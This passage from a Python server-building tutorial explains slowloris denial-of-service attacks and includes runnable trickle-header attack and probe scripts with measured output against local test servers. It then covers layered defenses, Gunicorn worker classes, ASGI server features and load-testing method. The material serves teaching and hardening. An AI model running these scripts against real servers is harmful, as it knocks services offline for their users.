    s.settimeout(None)
    socks.append(s)
print(f"opened {len(socks)} half-open requests; NEVER sending the terminating blank line")

try:
    while True:
        time.sleep(TRICKLE_EVERY)
        alive = 0
        for s in socks:
            try:
                s.send(b"X-Keep: alive\r\n")        # still not the blank line
                alive += 1
            except OSError:
                pass
        print(f"  trickled a byte to {alive}/{len(socks)} still-open sockets")
except KeyboardInterrupt:
    pass
```

Against **concept 1's original iterative server — which sets no timeout at all** — a single one of these connections (`N_SOCKETS=1`) is already a complete, permanent denial of service, for the same reason concept 1's `hold_connection.py` demo was: `recv()` blocks with no deadline, so the server's one worker is captured the instant the attacker connects and never released, whether the attacker trickles bytes or sends nothing at all. **Silence is already fatal to a server with no timeout; the trickling technique only matters once a timeout exists to defeat.**

### Runnable example — measuring the attack against a server that *does* have a timeout

Concept 2's `keepalive_server.py` and concept 4's `threaded_server.py` both call `conn.settimeout(KEEPALIVE_TIMEOUT)` with `KEEPALIVE_TIMEOUT = 5.0`. That timeout resets on *every* successful `recv()` call — which is precisely the idle-timer this section's intuition described, and precisely the kind of timer slowloris's trickle is designed to defeat, provided the attacker's trickle interval stays under it. Real, measured proof, run against the **pooled threaded server** (`POOL_SIZE = 8`):

```python
# slowloris_probe.py -- open N half-open connections, then measure how long
# ONE legitimate, complete request takes to get a reply.
import socket, time, sys

HOST, PORT = "127.0.0.1", 8080
N = int(sys.argv[1]) if len(sys.argv) > 1 else 8

socks = []
t0 = time.perf_counter()
for i in range(N):
    s = socket.create_connection((HOST, PORT))
    s.sendall(f"GET /api/time HTTP/1.1\r\nHost: x\r\nX-a: {i}\r\n".encode())  # never \r\n\r\n
    socks.append(s)
print(f"opened {N} half-open slowloris connections at t={time.perf_counter()-t0:.3f}s")

legit = socket.create_connection((HOST, PORT))
legit.settimeout(15)
legit.sendall(b"GET /api/time HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
t_sent = time.perf_counter() - t0
try:
    resp = legit.recv(4096)
    t_got = time.perf_counter() - t0
    print(f"legit request sent at t={t_sent:.3f}s, got reply at t={t_got:.3f}s "
          f"(waited {t_got - t_sent:.3f}s)")
except socket.timeout:
    print("legit request TIMED OUT waiting >15s for a reply")
for s in socks: s.close()
legit.close()
```

Real, measured output, `N=8` against a pool sized for exactly 8 concurrent workers:

```
$ python slowloris_probe.py 8
opened 8 half-open slowloris connections at t=0.007s
legit request sent at t=0.008s, got reply at t=5.020s (waited 5.012s)
```

**Eight attacking connections — well under any number that would look alarming in a connection-count graph — fully occupied all eight worker threads, and the legitimate ninth request waited 5.012 seconds: almost exactly `KEEPALIVE_TIMEOUT`.** This is the timeout mechanism working *and* the attack succeeding, at the same time: the timeout bounds the damage (5 seconds, not forever), but it doesn't prevent the damage, because the attacker never has to survive longer than the recovery window on any single connection — they only need `N ≥ POOL_SIZE` connections trickling *faster than the idle timeout*, refreshed forever, to keep every worker permanently reoccupied the instant the previous occupant times out. **A timeout shorter than the attacker's trickle interval defeats a given connection eventually; it does not defeat a sustained attack that maintains enough concurrent connections to saturate the pool.** This is precisely how the real slowloris tool was effective against thread/process-limited servers (Apache's classic `MaxClients`/`MaxRequestWorkers` ceiling) — it never needed much bandwidth or many total connections, only enough to exceed the server's *worker* ceiling, refreshed just fast enough.

Now the same attack, at a scale that would have been catastrophic against the threaded server, against the **event-loop server** from concept 5:

```
$ python slowloris_probe.py 300
opened 300 half-open slowloris connections at t=0.105s
legit request sent at t=0.105s, got reply at t=0.106s (waited 0.001s)
```

**Three hundred concurrent half-open connections, and the legitimate request was answered in one millisecond.** This is the honest, good half of the promise this note made at the top: because each `Conn` costs a few hundred bytes and zero threads (concept 5's whole point), a connection count that would have exhausted an eight-thread pool by a factor of nearly 40 doesn't even register as a resource problem for the event loop — `on_readable` is called for each trickle, appends a few bytes, finds no `\r\n\r\n`, and returns instantly, at essentially zero cost per idle attacker.

**But this is not immunity — it's a different, higher ceiling, and it is honestly conditional.** `eventloop_server.py`, exactly as built in concept 5, has **no timeout logic at all**. Every one of those 300 half-open connections stays registered in the selector *forever*, each one holding one file descriptor for as long as the attacker keeps trickling — and file descriptors are a genuinely finite resource (Day 5's `RLIMIT_NOFILE`, commonly 1024 by default and tunable up to the millions). An attacker with enough source addresses or enough patience can, in principle, keep opening slowloris connections against an event-loop server with no timeout logic until `accept()` itself starts failing with `EMFILE` ("too many open files") — at which point the event loop's advantage in *per-connection cost* stops mattering, because the failure has moved to a different, harder-to-scale-around resource (available file descriptors) rather than the resource (threads, memory) thread-per-connection ran out of first. **The event loop moves the failure point much higher; it does not remove it, and — this is the task's honest core lesson — whether it's "trivially handled" or "trivially exploited" depends entirely on whether you built timeout logic in, because `epoll`/`select` give you zero help here for free.**

### Runnable example — giving the event loop its own timeout, the way it actually has to be built

`epoll`/`select` answer exactly one question: "which of these descriptors is ready right now?" They have no concept of "this descriptor has been silent for N seconds" — readiness is the only currency they deal in. An event-loop server must track elapsed time itself, and must periodically act on that tracking, since nothing else will:

```python
# eventloop_timeouts.py -- eventloop_server.py, hardened with an idle-timeout
# sweep. Every Conn now remembers when it last did anything; every trip
# through the loop checks for connections that have overstayed.
import json, os, selectors, socket, time

HOST, PORT = "127.0.0.1", 8080
STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
MAX_HEADER_BYTES = 16 * 1024
IDLE_TIMEOUT = 5.0
SWEEP_INTERVAL = 1.0

os.makedirs(STATIC_DIR, exist_ok=True)
with open(os.path.join(STATIC_DIR, "hello.txt"), "w") as f:
    f.write("hello from the static directory\n")

sel = selectors.DefaultSelector()


class Conn:
    __slots__ = ("sock", "addr", "inbuf", "outbuf", "close_after_write", "last_activity")

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.inbuf = b""
        self.outbuf = b""
        self.close_after_write = False
        self.last_activity = time.monotonic()      # <-- the clock epoll doesn't give you


# try_parse_request, build_response, route, wants_keep_alive: UNCHANGED from
# eventloop_server.py (concept 5) -- omitted here to avoid repeating them.
# ... (identical to concept 5's version) ...

def on_readable(conn: Conn):
    conn.last_activity = time.monotonic()          # ANY bytes count as activity
    try:
        chunk = conn.sock.recv(4096)
    except BlockingIOError:
        return
    except (ConnectionResetError, OSError):
        close(conn); return
    if not chunk:
        close(conn); return
    conn.inbuf += chunk
    # ... parsing and dispatch identical to concept 5 ...


def close(conn: Conn):
    try:
        sel.unregister(conn.sock)
    except KeyError:
        pass
    conn.sock.close()


def sweep_stale_connections():
    """The event loop's answer to slowloris: since epoll/select can only tell
    you a descriptor HAS data, never that it's been silent too long, track
    wall-clock activity yourself and close anything that's overstayed, on
    every trip through the loop."""
    now = time.monotonic()
    stale = [key.data for key in list(sel.get_map().values())
             if key.data is not None and now - key.data.last_activity > IDLE_TIMEOUT]
    for conn in stale:
        close(conn)
    return len(stale)


def serve_forever():
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind((HOST, PORT)); lsock.listen(512)
    lsock.setblocking(False)
    sel.register(lsock, selectors.EVENT_READ, data=None)
    print(f"selector: {type(sel).__name__}   event-loop server WITH idle-timeout sweep")

    last_sweep = time.monotonic()
    while True:
        for key, mask in sel.select(timeout=SWEEP_INTERVAL):
            # ... accept / dispatch identical to concept 5 ...
            pass
        # sel.select(timeout=...) ALSO returns (with an empty list) when nothing
        # happened for SWEEP_INTERVAL seconds -- that's what makes this sweep
        # run even during a pure slowloris flood with no real traffic at all.
        if time.monotonic() - last_sweep >= SWEEP_INTERVAL:
            closed = sweep_stale_connections()
            if closed:
                print(f"  swept {closed} idle connection(s)")
            last_sweep = time.monotonic()
```

*(The omitted sections are byte-for-byte identical to concept 5's `eventloop_server.py` — only `Conn`, `on_readable`'s first line, and the two new functions above are additions. The full file was run exactly as shown, in one piece, to produce the measurement below.)*

Real, measured proof the sweep works: open 20 slowloris-style half-open connections, wait past the idle window, and check what happened to them.

```
$ python eventloop_timeouts.py &
selector: SelectSelector   event-loop server WITH idle-timeout sweep

$ python -c "
import socket, time
socks = [socket.create_connection(('127.0.0.1', 8080)) for _ in range(20)]
for i, s in enumerate(socks):
    s.sendall(f'GET /api/time HTTP/1.1\r\nHost: x\r\nX-a: {i}\r\n'.encode())
print('opened 20 half-open connections; sleeping 7s...')
time.sleep(7)
dead = sum(1 for s in socks if s.recv(10, socket.MSG_PEEK) == b'' if True)
"
opened 20 half-open connections; sleeping 7s...

# server log, during the sleep:
  swept 20 idle connection(s)
```

**All 20 were closed by the server in a single sweep pass, once each had gone quiet for longer than `IDLE_TIMEOUT`** — verified independently by attempting to read from each socket afterward and finding every one of them closed from the server's side. This closes the gap the previous demo left open: the event loop now has exactly the same idle-timeout protection the threaded server had, but pays for it at a few hundred bytes and one comparison per connection per sweep, rather than one entire OS thread per attacking connection.

**Why this works, line by line.**

- `Conn.last_activity = time.monotonic()` — note `monotonic()`, not `time.time()`. Wall-clock time can jump (NTP corrections, manual clock changes); a monotonic clock only ever moves forward, which is what you actually want for measuring an elapsed duration. Getting this wrong is a real, if rare, source of a timeout that fires early or never, right after a clock adjustment.
- The line is updated inside `on_readable` unconditionally, the moment *any* bytes arrive — including a single trickled header line that completes nothing. This is deliberately identical in spirit to the threaded server's `conn.settimeout()` resetting on every successful `recv()`: both measure "time since last activity," and both are, on their own, defeated by a trickle rate faster than the timeout. This sweep is not a *stronger* defense than the socket timeout used elsewhere — it is the *same* idea, implemented by hand because `epoll`/`select` provide no equivalent for free the way a blocking socket's own `settimeout()` does.
- `sel.select(timeout=SWEEP_INTERVAL)` doing double duty — waiting for real events *and* providing a periodic wake-up even when nothing happens — is what lets the sweep run on a schedule without a second thread or a separate timer mechanism. This is a common, idiomatic pattern in hand-rolled event loops: the "nothing happened, but I woke up anyway" case of a bounded-timeout wait is exactly where periodic maintenance work belongs.
- `sel.get_map()` exposes the selector's internal registry of every currently-watched descriptor — walking it once per sweep to check each `Conn.last_activity` is O(number of connections), which is fine at the scale a slowloris-style attack actually needs to reach for this to matter; it would need its own optimization (a time-ordered structure instead of a linear scan) only at a scale far beyond what a slowloris attack, specifically, requires.

### System design — abuse protection at the server level

**Problem.** Design defenses against slow, resource-exhausting clients — whether malicious (an actual slowloris-style attacker) or merely unfortunate (a real client on a terrible connection, a buggy proxy, a misconfigured health check) — for a server you're about to put on the public internet.

**Requirements.** Legitimate slow clients (genuinely poor mobile connections) shouldn't be punished unnecessarily; a deliberate attacker shouldn't be able to hold disproportionate resources hostage; the defenses should be cheap enough to run on every connection without becoming their own performance problem.

**The realistic alternatives, and why you need more than one.** A single idle-read timeout (this note's `KEEPALIVE_TIMEOUT`/`IDLE_TIMEOUT`, used throughout) is necessary but, as this section's `slowloris_probe.py` demonstrated at `N=8` against the thread pool, **not sufficient on its own** — it bounds how long any *one* connection can hold a resource, but does nothing to stop an attacker from maintaining enough concurrent connections, each individually well-behaved with respect to that timeout, to saturate the server anyway. A complete defense needs several distinct mechanisms, each closing a gap the others leave open:

1. **An idle-read timeout** (already built, throughout this note) — bounds how long a *single* connection can go silent before being dropped. Defeats a client that sends nothing after connecting (concept 1's `hold_connection.py`) and, given a strict-enough value, raises the bar for a trickle-based attacker.
2. **An absolute header/body deadline**, distinct from the idle timer — a hard "you have T seconds from connection open to deliver a complete set of headers, no matter how you pace your bytes," which an idle timer alone cannot express, because an idle timer resets on every byte regardless of overall elapsed time. This is the one genuinely new mechanism this section's Coffman-style analysis exposed: it is the *only* defense that a trickle paced just under the idle timeout cannot defeat, because it doesn't care about the gaps between bytes at all, only about total elapsed time.
3. **A maximum request size** (this note's `MAX_HEADER_BYTES`, present in every version) — bounds memory per connection regardless of timing; defends against a *fast*, large, malicious or malformed request rather than a slow one, a genuinely different attack shape (resource exhaustion via volume rather than via time).
4. **A cap on total concurrent connections** (concept 4's system design on bounding the accept loop, generalized) — the last line of defense: even with perfect per-connection timeouts, a large enough number of simultaneous attacking connections eventually exhausts *something* (threads, file descriptors), so a hard ceiling on total accepted-but-not-yet-fully-served connections, enforced by declining to `accept()` further connections once at capacity (letting them queue in the kernel's backlog, Day 11 §4, rather than in your own process), bounds the *total* resource commitment regardless of how well-paced any individual attacker is.

**The decision.** Layer all four. Real production servers do exactly this: Nginx exposes `client_header_timeout` and `client_body_timeout` (idle-oriented, close to mechanism 1/2 combined, tightened specifically in response to slowloris-class attacks historically), `client_max_body_size` (mechanism 3), and `worker_connections`/`limit_conn` (mechanism 4). No single one of Nginx's own knobs is "the slowloris fix" — the fix is the combination.

**The trade-off, honestly.** Every one of these mechanisms has a false-positive cost: an aggressive absolute header deadline will occasionally cut off a genuine client on a slow or congested network mid-request; a tight connection cap will occasionally queue or reject legitimate traffic during an honest, unexpected surge (concept 4's marketing-email scenario) exactly as it would an attack, because from the server's perspective the two can look identical in the first few seconds. There is no configuration of these four knobs that has zero cost in both directions simultaneously — tightening any of them trades some rejected-or-delayed legitimate traffic for reduced attack surface.

**The flip condition.** Tighten these values (shorter deadlines, smaller size caps, lower connection ceilings) the more your traffic is known, predictable, and internal — an internal service talking only to other services you control can be far stricter than a public-facing API serving unknown consumer devices on unknown networks, where genuine legitimate slowness is common and indistinguishable, in the first several seconds, from an attack. Loosen them, and lean more heavily on mechanism 4 (connection caps) and out-of-band mitigation (a CDN or DDoS-scrubbing service in front of the origin, Day 15/16) the more your traffic is public, high-variance, and beyond your ability to characterize in advance.

**Failure modes.** Setting the absolute deadline too aggressively silently drops real users on slow connections, appearing in metrics as an elevated error rate correlated with certain geographies or network types rather than as an obvious "attack" signature — a support-ticket-driven discovery, not a security-alert-driven one, which is precisely why it's worth erring conservative and monitoring before tightening further.

### Case study — Slowloris (2009): the tool and its real-world use

**What happened.** In June 2009, security researcher Robert "RSnake" Hansen released Slowloris, a tool implementing exactly the technique reproduced (in miniature) above: open many connections to a target web server, send partial HTTP requests, and periodically trickle additional header bytes to keep each connection "alive" from the server's point of view without ever completing the request. The tool was explicitly documented, by its author, as effective specifically against servers with a thread- or process-per-connection architecture and a limited worker ceiling — Apache's traditional MPMs being the headline example — because it could exhaust that ceiling using only a modest number of connections and negligible bandwidth, unlike a traditional volumetric denial-of-service attack. RSnake's own release materials noted explicitly that event-driven servers (lighttpd, nginx) and some others were largely unaffected by the technique in its original form — an early, practitioner-level statement of exactly this note's concept-4-versus-concept-5 distinction. The tool subsequently saw real-world use, most notably reported in connection with attacks on Iranian government websites during the 2009 post-election protests, and prompted widespread hardening — Apache shipped `mod_reqtimeout` and similar modules specifically to add the absolute-deadline mechanism this section's system design names as the genuinely necessary addition beyond a plain idle timeout.

**The engineering lesson, tied to this concept.** Slowloris is the sharpest possible illustration of the gap between "we have a timeout" and "we have a *sufficient* timeout" — Apache, at the time, generally did have connection-level timeout mechanisms, and the attack succeeded anyway, precisely because those timeouts measured idle time rather than total elapsed time, exactly the gap this section's system design's mechanism 2 exists to close.

**Primary sources.** Robert Hansen ("RSnake"), original Slowloris release documentation (ha.ckers.org, 2009 — the historical release notes describing the mechanism and which servers were and weren't affected). *Verify current: the original hosting location has drifted over the years as ha.ckers.org's ownership and structure changed; search for "RSnake Slowloris 2009" to find current mirrors/archives of the original documentation and contemporaneous security-press coverage of the Iranian election-protest usage, since exact URLs from 2009 are not stable.*

A distinct, much more recent case study belongs alongside this one, specifically because it's a useful contrast rather than the same mechanism restated: **HTTP/2 Rapid Reset (CVE-2023-44487)**, disclosed jointly by Google, Cloudflare, and Amazon Web Services in October 2023, exploited HTTP/2's stream multiplexing (a mechanism this note's servers don't implement at all — Day 14's territory) by having a client rapidly open and immediately cancel large numbers of request streams on a single connection, forcing the server to do real setup work for each stream before the cancellation was processed — an attack that, like slowloris, exploits an asymmetry between trivial client-side cost and real server-side cost, but through an entirely different mechanism (rapid stream churn on one multiplexed connection, not a single connection held open indefinitely) and against a different protocol layer. Cloudflare, Google, and AWS each published detailed technical breakdowns describing multi-hundred-thousand-request-per-second attacks enabled by this technique. **The honest, direct relevance to today's build:** this note's servers, which speak only HTTP/1.1 with no stream multiplexing, are not vulnerable to Rapid Reset specifically — but they are squarely vulnerable to slowloris, precisely because that's a property of how *this* note's connection model works, not a property that's simply "solved" by moving to a newer protocol version. *Verify current: this is a fast-moving area — check the current CVE record and each named vendor's own postmortem for the latest mitigation guidance before relying on specifics beyond the core mechanism described here.*

**Primary sources.** Cloudflare Blog, "HTTP/2 Rapid Reset: deconstructing the record-breaking attack" (October 2023); Google Cloud Blog and AWS Security Blog, contemporaneous joint disclosures; CVE-2023-44487.

### In production

**Best practices.** Layer all four mechanisms from this section's system design rather than relying on any single one; set an absolute header/body deadline in addition to an idle-read timeout, specifically because idle timeouts alone are the exact gap slowloris exploits; put a CDN or reverse proxy with its own hardened timeout/rate-limiting logic (Day 15, Day 16) in front of any hand-rolled or lightly-tested server, rather than trusting your own implementation to be the sole line of defense against adversarial traffic.

**Common mistakes, beginner → senior.** *Beginner:* no timeout at all (concept 1's original server) — instant, total vulnerability to even an accidental slow client. *Intermediate:* an idle timeout only, with no absolute deadline — this section's `slowloris_probe.py` measurement against the pool of 8 is exactly this mistake, made visible. *Senior:* an event-loop server with excellent per-connection cost characteristics but no timeout logic at all, mistaking "cheap per connection" for "immune to resource exhaustion" — this section's 300-connection event-loop demonstration is genuinely reassuring, but only because a timeout sweep was subsequently added; without it, the failure point simply moves to file descriptors instead of threads, as explicitly warned above.

**Observability.** Concurrent-connection count segmented by "has completed at least one full request" versus "still mid-handshake-of-headers" — a growing population stuck in the second bucket, disproportionate to your normal traffic mix, is slowloris's signature, distinguishable from an ordinary traffic spike (where the first bucket grows too) well before total resource exhaustion hits. Time-to-first-byte-of-body distribution, watched for a growing tail of connections that never progress past headers at all.

**Cost.** These defenses are essentially free in the case that matters most — legitimate, well-behaved traffic never notices any of the four mechanisms in this section's system design, because it never approaches any of the limits. The entire cost is borne only in the false-positive case (a genuine slow client cut off) and in the (usually negligible) CPU of the periodic sweep or per-connection timer bookkeeping itself.

---

## 7. Gunicorn's worker zoo: sync, gthread, gevent, ASGI workers

**Depth: [WORKING]**

### Intuition

Every architecture built by hand in this note — iterative, thread-per-connection, event loop — is a genuine, production-relevant choice, and Gunicorn, the most widely used Python WSGI application server, doesn't pick one and force it on you. It ships several **worker classes**, each a real, documented implementation of one of exactly the models this note built, and lets you choose per-deployment via `gunicorn --worker-class=<name>`. Having built each of these three models by hand, with your own bugs and your own measurements, you're now in a position to read Gunicorn's worker menu as a list of old friends rather than unfamiliar vocabulary.

### The menu, mapped onto today's build

Gunicorn's own documentation on worker types describes the following (as of this writing — worker names and defaults are the kind of fast-moving detail worth re-checking against Gunicorn's current docs before deploying):

- **`sync`** (the default) — one worker **process** (not thread), each handling **exactly one request at a time**, with no concurrency at all *within* a worker. This is concept 1's iterative model, almost exactly — the difference is that Gunicorn runs several `sync` worker *processes* in parallel (typically sized near the CPU core count), so concurrency comes from having several independent iterative servers behind one listening arrangement rather than from any concurrency inside one worker. A slow request in one `sync` worker blocks only *that* worker's other would-be clients — concept 1's exact failure mode, with the blast radius limited to `1/N` of your total worker count instead of your entire server.
- **`gthread`** — a fixed number of **threads per worker process** (`--threads`), handling multiple connections concurrently within one process. This is concept 4's thread-per-connection model, built and measured by hand above, wrapped in Gunicorn's process-management and configuration layer.
- **`gevent` / `eventlet`** — greenlet-based cooperative concurrency: many lightweight, cooperatively-scheduled "green threads" multiplexed onto a small number of real OS threads via an event loop under the hood, with blocking calls transparently patched (via monkey-patching) to yield to that event loop instead of blocking a real thread. This is architecturally concept 5's event-loop model, with the crucial difference that the monkey-patching is specifically designed to paper over exactly this note's concept-5 blocking-call problem for ordinary synchronous-looking code — at the cost of the monkey-patching itself being a real source of subtle bugs when a library does something the patcher doesn't correctly intercept.
- **An ASGI-compatible worker** for async frameworks (FastAPI, Starlette) — running a real coroutine-based event loop (`asyncio` or `uvloop`) underneath, the fully-built-out version of concept 5's model, with Day 21's coroutine machinery actually in place rather than this note's honest "deliberate stop" at hand-rolled callbacks. *Verify current: the specific package and import path for Gunicorn's ASGI worker class has moved over time as Uvicorn's own packaging evolved — check Uvicorn's current deployment documentation for the exact worker class name before configuring this.*

### System design — picking a worker class for a real deployment

**Problem.** You're deploying a Python web application behind Gunicorn. Which worker class, and why?

**The decision, mapped directly onto this note's four workloads (concept 5's system design):** a synchronous Django or Flask app doing ordinary CRUD work over a traditional, blocking database driver maps onto `sync` (with enough worker *processes* to use all your cores) or `gthread` (fewer processes, more threads each, better for I/O-wait-heavy workloads per Day 3 §1.7's Little's Law) — concept 4's exact reasoning, applied through Gunicorn's configuration surface instead of hand-written code. A long-poll or WebSocket-heavy service needs `gevent`/`eventlet` or a true ASGI worker — concept 5's exact reasoning: thousands of mostly-idle connections need the event-loop model's per-connection cost, not a thread each. A CPU-heavy endpoint (image resizing) needs `sync` or `gthread` regardless of how the rest of the app is built, because concept 5's system design already established that CPU-bound work belongs on real OS-scheduled threads or processes, never inline on a cooperative event loop shared with other requests.

**The trade-off and flip condition are identical to concepts 4 and 5's** — Gunicorn doesn't invent new trade-offs here, it packages the ones this note already derived by hand into a `--worker-class` flag. The judgment you now have from building each model yourself is exactly the judgment needed to read a `gunicorn.conf.py` and know whether it's configured sensibly for the workload it's serving.

### Case study — Gunicorn's own worker-type documentation, as a case study in "one tool, several architectures"

**What it demonstrates.** Rather than a postmortem, this is a case study in software design: Gunicorn's own documentation explicitly frames its worker-class system as a way to match server architecture to workload — it does not claim one worker class is universally best, and its guidance explicitly steers `sync` workers toward CPU-bound or trusted-client applications and async-capable workers toward high-concurrency, I/O-bound ones, which is precisely today's concept-5 system design's conclusion, arrived at independently by a widely-deployed production tool's own maintainers rather than asserted by this note.

**The engineering lesson.** A mature piece of infrastructure often doesn't hide the trade-off this note spent three concepts building — it surfaces it, directly, as a configuration choice, and trusts the operator to understand the workload well enough to choose correctly. Today's entire exercise is what makes that trust well-placed rather than a guess.

**Primary source.** Gunicorn documentation, "Design" and "Settings" pages (`docs.gunicorn.org`), specifically the worker-class descriptions and the guidance on choosing between them. *Verify current: worker class names, defaults, and the specific guidance text have evolved across Gunicorn versions — check the version you're actually deploying.*

### In production

**Best practices.** Start from Gunicorn's own guidance for your framework (sync frameworks default toward `sync`/`gthread`; async frameworks toward an ASGI worker) rather than guessing; size worker *process* count near the CPU core count as a starting point (`(2 × cores) + 1` is Gunicorn's own commonly cited heuristic) and worker *thread* count (for `gthread`) using Day 3 §1.7's Little's Law against your actual measured request latency and arrival rate.

**Common mistakes.** Using `sync` workers with a slow, blocking upstream call and too few worker processes — reproducing concept 1's total-blocking failure mode at the scale of "one worker out of N" rather than "the whole server," which is better but still a real, measurable capacity loss under load. Using `gevent`/`eventlet` with a library that does blocking I/O in a way the monkey-patcher doesn't intercept (a C extension doing its own blocking socket calls, for instance) — silently reproducing concept 5's exact blocking-event-loop failure, but now hidden behind an abstraction that was supposed to prevent it, which makes it considerably harder to diagnose than the plainly-visible version this note built and measured directly.

---

## 8. What a real ASGI server adds beyond our build

**Depth: [WORKING]**

### Intuition

Every server in this note is honest about being a teaching artifact, and it's worth being precise, in one place, about exactly what separates it from something like Uvicorn (the ASGI server FastAPI and Starlette are typically deployed on, and the subject of Day 28) — not as a vague "ours is worse," but as a specific list of named gaps, several of which this note already flagged as they came up.

### The gap list, specific and cross-referenced

- **A real, hardened HTTP parser.** Uvicorn uses `httptools` (bindings to Node.js's `llhttp` C parser) or a pure-Python `h11`-based fallback — both are the "adopt a battle-tested library" side of concept 1's first system design, fully realized rather than argued for.
- **Chunked transfer-encoding, on both request and response bodies** — concept 3's honestly-acknowledged gap, fully implemented in any real server.
- **HTTP/1.1 pipelining and edge-case framing per RFC 9112 in full**, including the request-smuggling-relevant `Content-Length`/`Transfer-Encoding` conflict handling concept 3's case study covers.
- **A real coroutine-based event loop** (`asyncio`, optionally accelerated by `uvloop`, a `libuv`-backed drop-in replacement for `asyncio`'s default loop) rather than concept 5's hand-rolled callback/state-machine style — meaning genuine `async`/`await` handler code, with the loop itself managing suspension and resumption, rather than manually toggling `selectors` interest flags.
- **Automatic offloading of synchronous framework code** — when a framework built on Uvicorn (like FastAPI) is given an ordinary `def` (not `async def`) route handler, Uvicorn/Starlette runs it in a bounded worker thread pool automatically, which is exactly concept 5's "what the real fix looks like" offload pattern, built out completely rather than left as this note's deliberate stop.
- **TLS termination** (Day 14) — every server in this note speaks plain HTTP; a real deployment needs TLS handled either by the ASGI server itself or, more commonly in production, terminated upstream by a reverse proxy (Day 16) in front of it.
- **HTTP/2 and HTTP/3 support** in some configurations (Day 14) — entirely absent from this note's HTTP/1.1-only servers, and the reason those servers are specifically vulnerable to slowloris but not to HTTP/2 Rapid Reset (concept 6's case study contrast).
- **Graceful reload and zero-downtime restarts**, worker health monitoring, and signal handling (`SIGTERM`/`SIGHUP` semantics, Day 2) for coordinating shutdown across many workers without dropping in-flight requests — operational machinery this note never touches, because every demo server here is killed outright between tests.
- **Access logging, request ID propagation, and structured observability hooks** in formats that integrate with real monitoring stacks — this note's servers only `print()` to a terminal.

### System design — when would you still hand-roll a raw-socket server today?

**Problem.** Given everything above, is there ever a legitimate reason to write a server this way outside of learning?

**The decision.** Rarely, and narrowly: a genuinely custom binary or text protocol layered *on top of* raw TCP that only superficially resembles HTTP (some IoT device protocols, some game networking, some financial-market data feeds do this deliberately, for reasons — minimal parsing overhead, no framework dependency footprint, full control over every byte — that don't apply to ordinary web APIs); an embedded or resource-constrained environment where even a minimal ASGI server's dependency footprint is unacceptable; or, as here, a deliberate pedagogical exercise. **For anything that is actually HTTP, serving actual clients, the answer is essentially never** — every gap listed above represents real engineering effort already paid for, by people who found real bugs the hard way, that a from-scratch build would have to rediscover independently.

**The flip condition, stated plainly, is really a non-flip:** there isn't a competitive, from-scratch alternative to an ASGI server for serving real HTTP traffic in Python today — this is one of the cases the note's own judgment framework says is worth naming honestly rather than manufacturing a false symmetry: "there isn't a real alternative here for production use" is itself the correct, useful conclusion, not a gap in the analysis.

### Case study — Uvicorn's adoption as the standard ASGI server for FastAPI and Starlette

**What it demonstrates.** Uvicorn, maintained under the Encode organization (the same group behind Starlette, Django REST Framework, and `httpx`), became the de facto standard ASGI server for the modern async-Python web ecosystem largely because it committed early to exactly the "adopt the hardened dependency" side of this note's recurring build-vs-buy question — building on `httptools`/`h11` for parsing and `uvloop` for the event loop rather than reimplementing either, and focusing its own engineering effort on the ASGI protocol layer and operational concerns (graceful reload, worker coordination) instead. Its documentation is explicit about which pieces are borrowed and why.

**Primary source.** Uvicorn documentation (`www.uvicorn.org`), "Deployment" and "Settings" pages. *Verify current: Uvicorn's own recommended production deployment pattern (standalone vs. behind Gunicorn as a process manager) has shifted over time — check current docs before deploying.*

### In production

**Best practices.** Use a real ASGI/WSGI server for anything facing real traffic (this section exists to make that unambiguous); understand what it's doing under the hood — which this whole note has been building toward — so that when it misbehaves, you have a real mental model rather than a black box.

**Condensed failure mode.** The single most common way teams get bitten *despite* using a real ASGI server: writing a synchronous, blocking call inside an `async def` handler anyway (a synchronous database driver, `requests` instead of `httpx`, a synchronous `time.sleep`) — this reproduces concept 5's exact blocking-event-loop failure, inside infrastructure that was specifically built to prevent it, because no ASGI server can automatically detect and offload a blocking call hidden inside code it didn't write. The automatic-offload feature described above only applies to whole handler functions declared as ordinary `def` — it does not rescue an `async def` handler that blocks internally.

---

## 9. Benchmarking the ladder — and against Nginx

**Depth: [WORKING]**

### Intuition

Every comparison in this note so far measured *correctness of the model* — does concurrency happen or not, does a timeout fire on schedule. A load test measures something different and equally necessary: *how does each version behave as load increases past comfortable levels, and where does it actually break first?* This is the study plan's explicit build task, and the honest way to do it is to design a real methodology rather than quote a single number, because a single number without context (what tool, what request shape, what hardware) is close to meaningless.

### A methodology worth actually using

1. **Fix the request shape and hold it constant across every server under test** — the same `/api/time` (near-zero handler cost, isolates pure request-handling overhead) and the same `/static/hello.txt` (isolates file-serving overhead) used throughout this note, so the comparison measures architecture, not workload differences.
2. **Ramp concurrency, don't fix it** — run at increasing concurrent-client counts (1, 10, 50, 100, 500…) rather than one arbitrary level, because, as concept 4's pool-of-8 measurement showed directly, a server's behavior *changes qualitatively* once concurrency crosses an internal limit (a pool size, a file descriptor ceiling) — a single-concurrency-level test can easily land entirely on one side of that cliff and miss it.
3. **Watch more than requests/second** — p50/p95/p99 latency (a server that's "fast on average" while a tail of requests times out is exactly concept 4's queuing behavior, invisible in a mean), error rate, and server-side resource usage (thread count, memory, open file descriptors — every one of these was the actual bottleneck in one of this note's concepts, not raw CPU).
4. **Load-test from a separate machine or process group than the server**, where possible — running the load generator and the server on the same box means they compete for the same CPU cores, which can make a fast server look artificially slow (or, worse, mask a real bottleneck in the server behind an equally real bottleneck in the generator).

A real tool (`wrk`, `hey`, or `locust`) implements this better than a hand-rolled script — this is, again, this note's recurring "adopt the tested tool" lesson (concept 1's parser system design), applied to load-testing infrastructure this time: a load generator has its own concurrency-correctness requirements (accurately reporting percentiles under contention, not becoming its own bottleneck) that are easy to get subtly wrong in a five-minute script.

### Reasoned expected outcomes, tied to mechanisms this note has already measured directly

Rather than presenting invented "benchmark" numbers as if they were a specific, controlled run (which they were not — a genuine multi-server, ramped-concurrency benchmark needs the real tooling above, run on real target hardware, to be honest data), here is what the mechanisms already measured in this note predict, and why — a reader who runs the methodology above against their own machine should see this *shape*, even though the exact numbers will differ:

- **The iterative server's throughput is essentially independent of concurrency** — concept 1 and concept 4's measurements already proved this directly (5 concurrent slow requests took the same total time as 5 sequential ones would). Under a ramped load test, expect requests/second to plateau almost immediately as concurrency increases past 1, and expect latency to grow *linearly* with concurrency instead (each additional concurrent client just waits longer in the kernel's accept backlog for its turn).
